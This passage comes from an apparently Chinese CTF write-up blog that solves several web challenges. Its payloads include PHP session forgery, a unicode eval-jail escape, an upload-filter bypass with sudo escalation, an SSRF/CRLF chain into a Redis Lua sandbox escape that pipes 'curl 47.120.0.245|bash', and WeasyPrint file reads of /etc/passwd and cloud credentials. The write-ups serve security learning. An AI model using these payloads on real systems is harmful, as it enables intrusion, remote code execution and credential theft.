<p>然后覆盖app.py去执行</p>
<h2 id="23-羊城杯决赛web3"><a href="#23-羊城杯决赛web3" class="headerlink" title="23.羊城杯决赛web3"></a>23.羊城杯决赛web3</h2><p>phpsession伪造</p>
<p>这里是另外一种形式的伪造</p>
<p>上问题代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;memos&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;memos&#x27;</span>] = [];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里接受了一个username参数作为session的值</p>
<p>momo.php这里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;memo&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;memo&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;memos&#x27;</span>][] = <span class="variable">$_POST</span>[<span class="string">&#x27;memo&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;backup&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$backupMemos</span> = <span class="title function_ invoke__">implode</span>(PHP_EOL, <span class="variable">$_SESSION</span>[<span class="string">&#x27;memos&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$random</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">8</span>));</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;/tmp/&#x27;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&#x27;_&#x27;</span> . <span class="variable">$random</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到我们写入的内容会被储存tmp下的临时目录，名字是usernam和随机数</p>
<p>服务提供了下载的方法 ，包括也可以自定义下载后缀</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$compressedData</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$backupMemos</span>);</span><br><span class="line">       <span class="variable">$filename</span> .= <span class="string">&#x27;.&#x27;</span> . <span class="variable">$compressionMethod</span>;</span><br><span class="line">       <span class="variable">$mimeType</span> = <span class="string">&#x27;text/plain&#x27;</span>;</span><br><span class="line">       <span class="keyword">while</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>, <span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">           <span class="variable">$filename</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$filename</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>如果自定义下载后缀，可以看到这里会将可能路劲穿越全部去掉</p>
<p>最后看到这里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] === <span class="literal">true</span>) : <span class="meta">?&gt;</span></span><br><span class="line">         &lt;li&gt;<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>); <span class="meta">?&gt;</span>&lt;/li&gt; &lt;!-- Only admin can get flag --&gt;</span><br></pre></td></tr></table></figure>

<p>如果session的admin值是true，我们就可以得到flag</p>
<p>这里显然是要伪造session为admin，然后得到flag</p>
<p>但是admin的值我们没法直接控制</p>
<h4 id="php的session储存机制"><a href="#php的session储存机制" class="headerlink" title="php的session储存机制"></a>php的session储存机制</h4><p>session会被储存在&#x2F;tmp目录下面</p>
<p>php的session是存放在文件中的 默认位置是<code>/tmp/sess_PHPSESSID</code>。如果用户名是sess，PHPSESSID设置成随机数</p>
<p>这里可以看到，储存的文件名字是session里面的username加下划线加phpsessid的随机数</p>
<p>如果把名字设置为sess，在里面写入我们想要的session，就可以做到伪造身份</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;AsaL1n&#x27;</span> ;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">  <span class="comment">//$fileContents = $_SESSION[&#x27;file_contents&#x27;];</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$fileContents</span>;</span><br><span class="line"> <span class="comment">// var_dump($_SESSION);</span></span><br><span class="line">  <span class="variable">$session_id</span> = <span class="title function_ invoke__">session_id</span>();</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$session_id</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后找我们生成的session内容，然后输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username|s:6:&quot;AsaL1n&quot;;admin|b:1;</span><br></pre></td></tr></table></figure>

<p>这里ro13转码下，就可以</p>
<p>只要我们注册一个sess的用户，然后写入自己转码之后的内容</p>
<p>然后下载的时候使用空后缀</p>
<p>这样会被写入tmp下面，然后获得那串随机数，伪造phpsessid就可以伪造admin</p>
<h2 id="24-对内赛-escape-plan"><a href="#24-对内赛-escape-plan" class="headerlink" title="24.对内赛 escape plan"></a>24.对内赛 escape plan</h2><p>越做越喜欢</p>
<p>给了源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># Docker images --&gt; python:3.8-alpine</span><br><span class="line"># No permission to cat /flag</span><br><span class="line"># Please run /readflag</span><br><span class="line">import base64</span><br><span class="line">from flask import Flask, request</span><br><span class="line"></span><br><span class="line">cmd = request.form.get(&quot;cmd&quot;, &quot;&quot;)</span><br><span class="line">cmd = base64.b64decode(cmd).decode()</span><br><span class="line">black_char = [</span><br><span class="line">    &quot;&#x27;&quot;, &#x27;&quot;&#x27;, &#x27;.&#x27;, &#x27;,&#x27;, &#x27; &#x27;, &#x27;+&#x27;, &#x27;*&#x27;, &#x27;/&#x27;,</span><br><span class="line">    &#x27;os&#x27;, &#x27;sys&#x27;, &#x27;io&#x27;, &#x27;subprocess&#x27;, &#x27;system&#x27;, &#x27;popen&#x27;,</span><br><span class="line">    &#x27;__&#x27;, &#x27;exec&#x27;, &#x27;eval&#x27;, &#x27;str&#x27;, &#x27;import&#x27;, &#x27;bytes&#x27;,</span><br><span class="line">    &#x27;except&#x27;, &#x27;if&#x27;, &#x27;for&#x27;, &#x27;while&#x27;, &#x27;pass&#x27;,</span><br><span class="line">    &#x27;with&#x27;, &#x27;assert&#x27;, &#x27;break&#x27;, &#x27;class&#x27;, &#x27;raise&#x27;,</span><br><span class="line">    &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;,</span><br><span class="line">]</span><br><span class="line">try:</span><br><span class="line">    eval(cmd)</span><br><span class="line">except Exception as e:</span><br><span class="line">    msg = &quot;error, &quot; + str(e)</span><br></pre></td></tr></table></figure>

<p>被ban了很多字符，简单的用unicode绕过就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">u = <span class="string">&#x27;𝟢𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbigncGluZyA3MDZoZHQuZG5zbG9nLmNuJykucmVhZCgp&quot;</span></span><br><span class="line"></span><br><span class="line">CMD = <span class="string">f&quot;𝐞val(vars(𝐞val(ⅼist(dict(_a_aiamapaoarata_a_=()))[len([])][::len(ⅼist(dict(aa=()))[len([])])])(ⅼist(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(ⅼist(dict(aa=()))[len([])])]))[ⅼist(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(ⅼist(dict(aa=()))[len([])])]](ⅼist(dict(<span class="subst">&#123;payload&#125;</span>=()))[len([])]))&quot;</span></span><br><span class="line"></span><br><span class="line">CMD = CMD.translate(&#123;<span class="built_in">ord</span>(<span class="built_in">str</span>(i)): u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;)</span><br><span class="line">url=<span class="string">&quot;http://150.158.160.64:30281/?cmd=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(CMD)</span><br><span class="line">cmd = base64.b64encode(CMD.encode()).decode()</span><br><span class="line"><span class="built_in">print</span>(cmd)</span><br><span class="line">url=url+cmd</span><br><span class="line">requ=requests.get(url=url)</span><br></pre></td></tr></table></figure>

<h2 id="25-对内赛-ezcms"><a href="#25-对内赛-ezcms" class="headerlink" title="25.对内赛 ezcms"></a>25.对内赛 ezcms</h2><p>说是sms，实际上是自己写的漏洞</p>
<p>漏洞点出在如下代码</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230926194117399.png" alt="image-20230926194117399"></p>
<p>在这里</p>
<p>end函数存在问题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">end 函数原本的作用就是返回数组的最后一个元素，在上面看的是正常的。但是如果我们这里把对数组赋值的顺序换一下(先给 arr[2] 赋值)，可以看到结果就变了。</span><br><span class="line">继续尝试会发现 reset 函数也是一样，第一个给数组赋值的值就是 reset 函数返回的值，并不一定是arr[0]。</span><br><span class="line">所以构造playloadfilename[1] = php</span><br><span class="line">filename[0] = png</span><br><span class="line">end取的是png能通过校验</span><br><span class="line">在后面拼接 $filename 时候，再一次拼接到后缀名</span><br></pre></td></tr></table></figure>

<p>这里上传木马</p>
<p>然后sudio提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;c3VkbyBhcHQtZ2V0IHVwZGF0ZSAtbyBBUFQ6OlVwZGF0ZTo6UHJlLUludm9rZTo6PScvYmluL2NhdCAvcm9vdC9mbGFnZ2dfMXNfaGVyZSc=&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="26-对内赛-easyjs"><a href="#26-对内赛-easyjs" class="headerlink" title="26.对内赛 easyjs"></a>26.对内赛 easyjs</h2><p>上来给了源码</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230926195148770.png" alt="image-20230926195148770"></p>
<p>看到这里，可以知道proxy这个地方接受一个url为参数</p>
<p>在appjs里面，监听3000端口，可以通过上面的ssrf来访问这里</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230926195659477.png" alt="image-20230926195659477"></p>
<p>看这里的代码，看到给出了redis的密码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> redisClient = redis.<span class="title function_">createClient</span>(<span class="string">&quot;redis://127.0.0.1:6379&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">auth_pass</span>: <span class="string">&quot;tHis_1s_Red1s_pAssw0rd&quot;</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>ok，没有思路了，下面都是学长教的</p>
<p>看到这里</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230926195954156.png" alt="image-20230926195954156"></p>
<p>这里调用了restrictToLocalhost这个函数，要求访问时候是本地的ip</p>
<p>这里就有思路，通过ssrf来获得本地的ip，然后打redis</p>
<p>现在需要解决如何将自己构造的恶意数据包添加到第二次访问的数据里面</p>
<p>这里需要CRLF漏洞去打redis</p>
<h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p>CRLF是 “ 回车+换行 ”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。</p>
<p>CRLF漏洞可以造成Cookie会话固定漏洞和反射型XSS（可过waf）的危害</p>
<p>假设注入是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://baidu.com/xxx%0a%0dSet-Cookie:test=123</span><br></pre></td></tr></table></figure>

<p>url参数值拼接到Location字符串中，设置成响应头</p>
<p>就会多一个注入头，如果是302的话，相当与我们控制了一个头</p>
<p>测试工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crlffuzz -u &quot;url&quot;</span><br></pre></td></tr></table></figure>

<p>还可以配合xxs联合注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">添加一个X-XSS-Protection 0 去关</span><br></pre></td></tr></table></figure>

<p>这里我们是ssrf，尝试控制，后端接受了我的输入之后</p>
<p>访问url&#x2F;api&#x2F;connect?target&#x3D;</p>
<p>这里拼接进去，就完成看crlf注入</p>
<p>这里是一个cve</p>
<h2 id="js的组件漏洞自动审计"><a href="#js的组件漏洞自动审计" class="headerlink" title="js的组件漏洞自动审计"></a>js的组件漏洞自动审计</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">到相关目录下</span><br><span class="line">npm audit</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230926201503996.png" alt="image-20230926201503996"></p>
<p>看到这个地方存在crlf头，这样前面的步骤都已经完成，现在就要看redis如何注入了</p>
<h2 id="Redis沙盒逃逸漏洞-RCE"><a href="#Redis沙盒逃逸漏洞-RCE" class="headerlink" title="Redis沙盒逃逸漏洞 RCE"></a>Redis沙盒逃逸漏洞 RCE</h2><p>Redis一直有一个攻击点,就是在用户连接redis后,可以通过eval命令执行lua脚本，但这个脚本跑在沙箱里,正常情况下无法执行命令,读取文件。Debian以及Ubuntu发行版的源在打包Redis时，在Lua沙箱中遗留了一个对象package，攻击者可以利用这个对象提供的方法加载动态链接库liblua里的函数，进而逃逸沙箱执行任意命令（同时利用该漏洞需要具备可在Redis中执行eval命令的权限）<br>影响</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.2 &lt;= redis &lt; 5.0.13</span><br><span class="line">2.2 &lt;= redis &lt; 6.0.15</span><br><span class="line">2.2 &lt;= redis &lt; 6.2.5</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;whoami&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>有了上面这些，就可以构造我们的payload 了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/proxy?url=http://127.0.0.1:3000/api/connect?targetIp=http://127.0.0.1:6379%26headers%5Bhost%5D=%2520%250D%250A%250D%250Aauth%2520tHis_1s_Red1s_pAssw0rd%250D%250Aeval%2520%2527local%2520io_l%2520%253D%2520package.loadlib%2528%2522/usr/lib/x86_64-linux-gnu/liblua5.1.so.0%2522%252C%2520%2522luaopen_io%2522%2529%253B%2520local%2520io%2520%253D%2520io_l%2528%2529%253B%2520local%2520f%2520%253D%2520io.popen%2528%2522curl%252047.120.0.245%257Cbash%2522%252C%2520%2522r%2522%2529%253B%2520local%2520res%2520%253D%2520f%253Aread%2528%2522%252Aa%2522%2529%253B%2520f%253Aclose%2528%2529%253B%2520return%2520res%2527%25200%250D%250Atest%253A%2520</span><br></pre></td></tr></table></figure>

<p>url地址来一次解码，然后后端解析接受的再来一次url解码</p>
<h2 id="27-羊城杯2023决赛-web4"><a href="#27-羊城杯2023决赛-web4" class="headerlink" title="27.羊城杯2023决赛 web4"></a>27.羊城杯2023决赛 web4</h2><p>admin&#x2F;admin888弱密码登录</p>
<p>然后需要爆破字典</p>
<p>爆破出参数是w1key</p>
<p>使用fuzz字典，发现是无字母rce，直接上payload打就好了</p>
<h2 id="28-羊城杯2023决赛-web5"><a href="#28-羊城杯2023决赛-web5" class="headerlink" title="28.羊城杯2023决赛 web5"></a>28.羊城杯2023决赛 web5</h2><p>上来先注册，是一个jwt伪造，密钥搞不出来，看来是空的伪造isadmin是true之后，得到pdf界面</p>
<p>可以通过输入网址，得到相关的pdf，看来是将html渲染为pdf</p>
<h3 id="WeasyPrint导致的ssrf漏洞"><a href="#WeasyPrint导致的ssrf漏洞" class="headerlink" title="WeasyPrint导致的ssrf漏洞"></a>WeasyPrint导致的ssrf漏洞</h3><p>WeasyPrint 是一个开源的智能WEB报告生成服务，用它可以方便地在WEB应用中制作生成PDF报告，它能把简单的HTML标记转变成华丽的**、票据、统计报告等，用户在相应的HTML模板或URL链接中填写好要求的字段后就能自动生成PDF报告。</p>
<blockquote>
<p>允许嵌入短小数字作为HTML标记</p>
<p>不允许执行Javascript脚本</p>
<p>不允许执行iframe或类似标记</p>
</blockquote>
<p>WeasyPrint对img、embed和object等标签集都进行了重定义但是，存在link属性，允许pdf插入任意形式的网页和本地文件内容</p>
<p>如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=attachment href=&quot;file:///root/secret.txt&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;h1&gt;XSS&lt;/h1&gt;</span><br></pre></td></tr></table></figure>

<p>可能会被解析</p>
<p>存在很多利用方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xss若存在，测试 &lt;h1&gt;XSS&lt;/h1&gt;是否解析</span><br><span class="line">若存在XSS，测试是否能使用 &lt;iframe&gt;等标签</span><br><span class="line">若存在XSS，测试用&lt;iframe&gt;,&lt;img&gt;等包含内网或外部js文件</span><br><span class="line"></span><br><span class="line">存在ssrf，就尝试 file://,about://,res://</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;iframe src=&quot;http://localhost&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;img src=x onerror=document.write(&#x27;aaaa&#x27;)&gt;</span><br><span class="line">&lt;img src=x onerror=document.write(&#x27;aaaa&#x27;%2bwindow.location)&gt;</span><br><span class="line">&lt;link rel=attachment href=&quot;file:///root/secret.txt&quot;&gt;</span><br><span class="line">&lt;iframe src=file:///etc/passwd /&gt;</span><br><span class="line">&lt;script&gt;x=new XMLHttpRequest;x.onload=function()&#123;document.write(this.responseText)&#125;;x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&lt;/script&gt;</span><br><span class="line">&lt;iframe src=&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&gt;</span><br></pre></td></tr></table></figure>

<p> 这题限制了必须要包含http之类的内容，我们可以再本地搭建一个1.html的网页</p>
<p>里面的内容是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;link rel=&quot;attachment&quot; href=&quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>尝试让网页包含这个页面，输出pdf之后</p>
<p>使用binwalk 去输出</p>
<p>binwalk -e pdf</p>
<p>得到flag</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230927185811169.png" alt="image-20230927185811169"></p>
<h2 id="29-台州市赛初赛-ezphp2"><a href="#29-台州市赛初赛-ezphp2" class="headerlink" title="29 台州市赛初赛 ezphp2"></a>29 台州市赛初赛 ezphp2</h2><blockquote>
<p>shi一样，没测好环境就上题，小杯养的</p>
</blockquote>
<p>上来看到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$seed</span> = <span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">uniqid</span>(),<span class="number">10</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">getallheaders</span>());</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$flag</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$result</span> . <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$value</span>)+<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$answer</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$answer</span> == <span class="title function_ invoke__">substr</span>(<span class="variable">$result</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$answer</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;wow~&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no~&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no~&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这里getallheader函数这里存在变量覆盖</p>
<p>传入seed可以覆盖种子</p>
<p>然后使用一个脚本爆破answer的值就可以了</p>
<p>但是传入的所有header会首字母转换大写，所以肯定出不来</p>
<p>这里修一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$Seed</span> = <span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">uniqid</span>(),<span class="number">10</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">getallheaders</span>());</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$Seed</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$flag</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$result</span> . <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$value</span>)+<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$Answer</span>))&#123;</span><br><span class="line"></span><br><span class="line">  